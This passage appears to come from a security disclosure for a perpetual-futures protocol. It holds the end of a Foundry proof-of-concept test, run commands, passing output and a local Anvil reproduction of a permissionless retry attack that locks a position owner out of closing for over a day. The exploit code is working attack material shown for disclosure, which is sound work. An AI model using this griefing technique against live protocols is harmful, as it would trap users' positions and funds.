            attacker.executeAndRetry(orderId, protectionId, _executionPriceData(GAPPED_EXECUTION_PRICE));
        assertEq(uint8(failedResult.status), uint8(OrderV3Types.LifecycleStatus.Failed));
        assertEq(uint8(failedResult.terminalReason), uint8(OrderV3Types.TerminalReason.ConstraintViolation));

        lockoutStartedAt = block.timestamp;
        for (uint256 i; i < ONE_DAY_EXPIRY_RETRY_CYCLES; ++i) {
            vm.warp(uint256(productionRouter.lifecycleBook().orderTiming(retryOrderId).executionDeadline) + 1);
            uint256 gasBefore = gasleft();
            (OrderV3Types.ExecutionResult memory result, uint64 replacementOrderId) =
                attacker.expireAndRetry(retryOrderId, protectionId);
            uint256 measuredCycleGas = gasBefore - gasleft();
            if (i == 0) {
                emit log_named_uint("Large-margin expire-and-retry cycle gas", measuredCycleGas);
            }
            assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Failed));
            assertEq(uint8(result.terminalReason), uint8(OrderV3Types.TerminalReason.Expired));
            retryOrderId = replacementOrderId;
        }

        (uint256 size, uint256 marginAssets,,,,,) = engine.positions(ALICE);
        assertGe(block.timestamp - lockoutStartedAt, 1 days, "large-position lockout lasts at least one day");
        assertEq(size, LARGE_POSITION_SIZE, "large position remains open after the one-day lockout");
        assertGt(marginAssets, POSITION_MARGIN_ASSETS, "large-position margin exceeds the primary PoC margin");
        emit log_named_decimal_uint("Large position margin assets", marginAssets, 6);
    }

    function _createTriggeredProtectionWithGapExceededLimits(
        address account,
        bool createThroughBatch
    )
        internal
        returns (
            uint64 protectionId,
            uint64 orderId,
            PositionProtectionTypes.CloseFinancialLimits memory retainedLimits
        )
    {
        _open(account, CfdTypes.Side.LONG, POSITION_SIZE, POSITION_MARGIN_ASSETS, MARK_PRICE);
        PositionProtectionTypes.PositionProtectionParams memory params = _stopLossParamsWithGapHeadroom(POSITION_SIZE);
        retainedLimits = params.closeLimits;

        if (createThroughBatch) {
            SimpleAccountV08BatchMock.Call[] memory calls = new SimpleAccountV08BatchMock.Call[](1);
            calls[0] = SimpleAccountV08BatchMock.Call({
                target: address(protectionActions),
                value: 0,
                data: abi.encodeCall(IPositionProtectionActions.createPositionProtection, (params))
            });
            vm.prank(ALICE);
            ownerAccount.executeBatch(calls);
            protectionId = protectionViews.activePositionProtectionId(account);
        } else {
            vm.prank(account);
            protectionId = protectionActions.createPositionProtection(params);
        }

        _executionPriceData(LONG_STOP_LOSS);
        vm.prank(TRIGGER_KEEPER);
        orderId = protectionActions.triggerPositionProtection(protectionId, _livePriceData(LONG_STOP_LOSS));
    }

    function _ownerRecoveryCalls(
        uint64 orderId,
        uint64 protectionId,
        PositionProtectionTypes.CloseFinancialLimits memory repaired,
        bytes[] memory priceData
    ) internal view returns (SimpleAccountV08BatchMock.Call[] memory calls) {
        calls = new SimpleAccountV08BatchMock.Call[](3);
        calls[0] = SimpleAccountV08BatchMock.Call({
            target: address(productionRouter),
            value: 0,
            data: abi.encodeCall(IPerpsKeeper.executeOrder, (orderId, priceData))
        });
        calls[1] = SimpleAccountV08BatchMock.Call({
            target: address(protectionActions),
            value: 0,
            data: abi.encodeCall(
                IPositionProtectionActions.amendLatchedPositionProtectionCloseLimits, (protectionId, repaired)
            )
        });
        calls[2] = SimpleAccountV08BatchMock.Call({
            target: address(protectionActions),
            value: 0,
            data: abi.encodeCall(IPositionProtectionActions.retryPositionProtectionClose, (protectionId))
        });
    }

    function _repairedLimits() internal pure returns (PositionProtectionTypes.CloseFinancialLimits memory repaired) {
        repaired = PositionProtectionTypes.CloseFinancialLimits({
            maxExecutionNotionalAssets: type(uint256).max,
            maxGrossAccountDebitAssets: type(uint256).max,
            maxActionChargeAssets: type(uint256).max,
            maxExplicitFeesAssets: type(uint256).max
        });
    }

    function _manualCloseRequest() internal view returns (OrderV3Types.OrderRequest memory request) {
        uint256 window = productionRouter.maxExecutionWindowSeconds();
        request.clientOrderId = keccak256(abi.encode("retry-lockout-manual-close", productionRouter.nextCommitId()));
        request.side = CfdTypes.Side.LONG;
        request.sizeDelta = POSITION_SIZE;
        request.targetPrice = engine.CAP_PRICE();
        request.isClose = true;
        request.bounds = OrderV3Types.ExecutionBounds({
            submitBy: uint64(block.timestamp + window),
            executionWindowSeconds: uint32(window),
            allowedExecutionModes: 1 | 2 | 4,
            expectedConfigHash: productionRouter.lifecycleBook().currentExecutionConfigHash(),
            maxExecutionBountyAssets: type(uint256).max,
            maxExecutionNotionalAssets: type(uint256).max,
            maxGrossAccountDebitAssets: type(uint256).max,
            maxActionChargeAssets: type(uint256).max,
            maxExplicitFeesAssets: type(uint256).max,
            maxPostPositionSize: type(uint256).max,
            minPostSettlementBalanceAssets: 0,
            minPostPositionEquityAssets: 0,
            maxPostLeverageBps: type(uint32).max
        });
    }

    function _executionPriceData(
        uint256 price
    ) internal returns (bytes[] memory updateData) {
        vm.roll(vm.getBlockNumber() + 1);
        vm.warp(vm.getBlockTimestamp() + 1);
        uint256 publishTime = vm.getBlockTimestamp();
        uint64 nextOrderId = productionRouter.nextExecuteId();
        if (nextOrderId != 0) {
            (IOrderRouterAccounting.PendingOrderView memory pending,) =
                productionRouter.getPendingOrderView(nextOrderId);
            uint256 candidate = uint256(pending.commitTime) + 1;
            if (pending.orderId != 0 && candidate <= publishTime) {
                publishTime = candidate;
            }
        }
        baseMockPyth.setAllUniquePrices(
            _basePythFeedIds(), int64(uint64(price)), 0, int32(-8), publishTime, publishTime == 0 ? 0 : publishTime - 1
        );
        updateData = new bytes[](1);
        updateData[0] = abi.encode(price);
    }

    function _assertCloseLimits(
        PositionProtectionTypes.CloseFinancialLimits memory actual,
        PositionProtectionTypes.CloseFinancialLimits memory expected
    ) internal pure {
        assert(actual.maxExecutionNotionalAssets == expected.maxExecutionNotionalAssets);
        assert(actual.maxGrossAccountDebitAssets == expected.maxGrossAccountDebitAssets);
        assert(actual.maxActionChargeAssets == expected.maxActionChargeAssets);
        assert(actual.maxExplicitFeesAssets == expected.maxExplicitFeesAssets);
    }

    function _stopLossParamsWithGapHeadroom(
        uint256 positionSize
    ) internal pure returns (PositionProtectionTypes.PositionProtectionParams memory params) {
        params.stopLossTriggerPrice = LONG_STOP_LOSS;
        params.closeLimits = PositionProtectionTypes.CloseFinancialLimits({
            maxExecutionNotionalAssets: (positionSize * AUTHORIZED_CLOSE_PRICE) / 1e20,
            maxGrossAccountDebitAssets: type(uint256).max,
            maxActionChargeAssets: type(uint256).max,
            maxExplicitFeesAssets: type(uint256).max
        });
        assert(params.closeLimits.maxExecutionNotionalAssets >= (positionSize * LONG_STOP_LOSS) / 1e20);
        assert(params.closeLimits.maxExecutionNotionalAssets < (positionSize * GAPPED_EXECUTION_PRICE) / 1e20);
    }

    function _refreshMark(
        uint256 price
    ) internal {
        if (block.timestamp <= engine.lastMarkTime()) {
            vm.warp(uint256(engine.lastMarkTime()) + 1);
        }
        productionRouter.updateMarkPrice(_livePriceData(price));
    }

    function _livePriceData(
        uint256 price
    ) internal view returns (bytes[] memory updateData) {
        bytes32[] memory ids = _basePythFeedIds();
        MockPyth.FeedUpdate[] memory ticks = new MockPyth.FeedUpdate[](ids.length);
        uint256 previous = engine.lastMarkTime();
        for (uint256 i; i < ids.length; ++i) {
            ticks[i] =
                MockPyth.FeedUpdate(ids[i], MockPyth.MockPrice(int64(uint64(price)), 0, -8, block.timestamp, previous));
        }
        updateData = new bytes[](1);
        updateData[0] = abi.encode(ticks);
    }

}
~~~

### Running the PoC

Prerequisites:

- Install Foundry and confirm that `forge --version` succeeds.
- Run the commands from the repository root.
- Check out the program's in-scope commit `a82d4fefb02768e5b3bddcc97dee371eee24fea8`.
- Add the complete file above at `packages/perps/test/audit/RetryProtectionLockoutPoC.t.sol`.
- No RPC URL, fork endpoint, private key, Hermes key, or environment variable is required for the five Foundry tests.

Run all five tests:

~~~bash
forge test --root packages/perps --match-path "test/audit/RetryProtectionLockoutPoC.t.sol" --gas-limit 3000000000 -vv
~~~

Run only the main one-day proof with a full trace:

~~~bash
forge test --root packages/perps --match-path "test/audit/RetryProtectionLockoutPoC.t.sol" --match-test "test_PermissionlessRetryLocksOwnerOutForMoreThanOneDay" --gas-limit 3000000000 -vvvv
~~~

Run only the large-position scaling proof with a full trace:

~~~bash
forge test --root packages/perps --match-path "test/audit/RetryProtectionLockoutPoC.t.sol" --match-test "test_LargerMarginLockoutUsesTheSameExpiryRetryWork" --gas-limit 3000000000 -vvvv
~~~

Run only the smart-account ordering proof with a full trace:

~~~bash
forge test --root packages/perps --match-path "test/audit/RetryProtectionLockoutPoC.t.sol" --match-test "test_AttackerOrderingMakesSmartAccountRecoveryBatchStale" --gas-limit 3000000000 -vvvv
~~~

If build artifacts are stale:

~~~bash
forge clean --root packages/perps
forge test --root packages/perps --match-path "test/audit/RetryProtectionLockoutPoC.t.sol" --gas-limit 3000000000 -vv
~~~

Actual output from the final run:

~~~text
Ran 5 tests for test/audit/RetryProtectionLockoutPoC.t.sol:RetryProtectionLockoutPoCTest
[PASS] test_AttackerOrderingMakesSmartAccountRecoveryBatchStale() (gas: 10055533)
[PASS] test_Control_OwnerRepairsLimitsWhenNobodyRetries() (gas: 6220733)
[PASS] test_Control_SmartAccountOwnerEscapesAtomicallyWhenItsBatchExecutesFirst() (gas: 6118005)
[PASS] test_LargerMarginLockoutUsesTheSameExpiryRetryWork() (gas: 1483145573)
Logs:
  Large-margin expire-and-retry cycle gas: 1118788
  Large position margin assets: 9930.000000

[PASS] test_PermissionlessRetryLocksOwnerOutForMoreThanOneDay() (gas: 1968279480)
Logs:
  Measured expire-and-retry cycle gas: 1118793
  Final locked position margin assets: 1986.000000

Suite result: ok. 5 passed; 0 failed; 0 skipped; finished in 4.72s (6.54s CPU time)

Ran 1 test suite in 4.73s (4.72s CPU time): 5 tests passed, 0 failed, 0 skipped (5 total tests)
~~~

### Optional transaction-receipt reproduction

The primary PoC does not need a fork. This optional procedure reproduces an end-to-end receipt for one attacker cycle on a local Anvil fork.

Temporarily add this key under `[profile.default]` in `packages/perps/foundry.toml`:

~~~toml
fs_permissions = [{ access = "read-write", path = "./" }]
~~~

Generate the post-failure state. The test logs the exact attacker address, current order ID, and protection ID before dumping:

~~~bash
DUMP_RETRY_RECEIPT_STATE=true \
RETRY_RECEIPT_STATE_PATH=retry-lockout-state.json \
forge test --root packages/perps \
  --match-path "test/audit/RetryProtectionLockoutPoC.t.sol" \
  --match-test "test_PermissionlessRetryLocksOwnerOutForMoreThanOneDay" \
  --gas-limit 3000000000 -vv
~~~

Convert the Forge state dump into an Anvil genesis allocation and start the local fork:

~~~bash
jq '{alloc:.}' packages/perps/retry-lockout-state.json > /tmp/retry-lockout-genesis.json

anvil \
  --fork-url https://sepolia-rollup.arbitrum.io/rpc \
  --init /tmp/retry-lockout-genesis.json \
  --port 8546 \
  --silent \
  --gas-price 20020000 \
  --block-base-fee-per-gas 0
~~~

In another terminal, send the permissionless attacker call from the first standard Anvil development account:

~~~bash
cast send \
  --rpc-url http://127.0.0.1:8546 \
  --private-key 0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80 \
  0x1E964AC317b4cAD5E2178E3B98752f08A1d2B9E7 \
  "expireAndRetry(uint64,uint64)" 2 1
~~~

Our run returned `status: 1` and `gasUsed: 1,019,488`. The local transaction hash was `0x732a41f5c7fc7e62997582954c5d2580b4620844f2beedd59f3afaa8e9c7e501`. A new fork head or modified PoC can produce a different address or hash, so use the identifiers printed by the state-dump run.

Afterward, remove the temporary `fs_permissions` line and delete `packages/perps/retry-lockout-state.json`. Neither is needed for the primary PoC.
